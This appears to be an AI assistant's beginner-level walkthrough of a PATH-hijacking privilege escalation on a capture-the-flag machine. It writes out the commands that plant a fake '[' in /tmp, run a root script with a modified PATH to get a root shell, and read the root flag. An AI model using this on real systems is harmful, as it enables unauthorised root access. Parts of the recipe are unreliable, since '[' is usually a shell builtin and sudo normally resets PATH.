Got it — thank you for being honest. No worries. Let me explain this **ultra slowly**, step by step, in **real-world beginner-friendly language**.

---

## 🧠 Imagine this situation:

You found a script called `cleanup.sh`. It runs with **admin powers** (called “root”).

Inside this script, it runs a command like this:

```bash
[ something ]
```

But it **doesn't** say:

```bash
/bin/[ something ]
```

That **tiny difference** matters a LOT. Why?

---

## 🛣 What is `$PATH`?

`$PATH` is like a list of places your computer checks when you type a command.

Example:

When you type:

```bash
ls
```

The computer doesn’t magically know what `ls` is. It looks in the list of folders inside `$PATH`, like:

```
/usr/local/bin
/usr/bin
/bin
```

It goes through them one by one and asks:

> "Is there an `ls` file here? Is it executable?"

When it finds it, it runs it.

---

## 👿 What’s the trick?

Because `cleanup.sh` uses `[ something ]` without the full path, **you** can say:

> “Hey computer, before checking the normal folders, check *my folder* first!”

So you create your **own fake version** of `[`, and tell the computer to check `/tmp` first.

How?

---

## 👣 Step-by-step like a hacker:

### 🪝 Step 1: Make your evil command

```bash
touch /tmp/[
echo '/bin/bash' > /tmp/[
chmod +x /tmp/[
```

This:

* Creates a file named `[`
* Writes `'/bin/bash'` inside it (meaning: open a Bash shell)
* Makes it executable

So now, when this file is run, it opens a shell.

---

### 🧪 Step 2: Trick the system to run your version

Now you run the vulnerable script like this:

```bash
sudo PATH=/tmp:$PATH /opt/cleanup.sh
```

Let’s break it down:

* `sudo` = run as root
* `PATH=/tmp:$PATH` = tell the computer:

  > “Before checking `/bin`, check `/tmp` for commands.”
* `/opt/cleanup.sh` = this is the script that calls `[ something ]`

Now, when the script runs `[`, it finds **your evil version** in `/tmp`.

So it runs **your `/tmp/[`**, which just opens a **root shell** (because you're running the script as root).

---

### 🏁 Final Result:

You are now inside a **root shell** — you have full admin access to the machine.

You can now do this:

```bash
cat /root/root.txt
```

And read the secret flag.

## 🧸 Super Simple Analogy:

Imagine a cleaner is told:

> “Use the mop.”

But the cleaner doesn’t know where the mop is. They look in a list of rooms in order:

1. Your Room
2. Closet
3. Garage

You sneak in and **replace the mop in Your Room** with a flame-thrower.
The cleaner says “Ah! Here’s the mop!” and uses it — and chaos happens.

That’s what you did: you replaced a command with your own version by changing where the system looks first.
